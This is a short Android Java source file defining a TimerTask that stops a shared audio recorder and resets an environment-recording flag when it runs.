package system.service.task;

import java.util.TimerTask;

import system.service.GlobalValues;

import android.content.Context;
import android.util.Log;

/**
 * Implementation of the timer task for stopping recorder when executing env recording
 */
public class StopRecorderTask extends TimerTask 
{
	private final static String LOGTAG = "StopRecorderTask";
	
	private Context context;
	
	public StopRecorderTask(Context context)
	{
		super();
		this.context = context;
	}
	
	public void run() 
	{
		try {
			GlobalValues.recorder.stop();
		} catch (Exception ex) {
			
		}
		
		GlobalValues.IS_ENV_RECORDING = false;
	}	
}
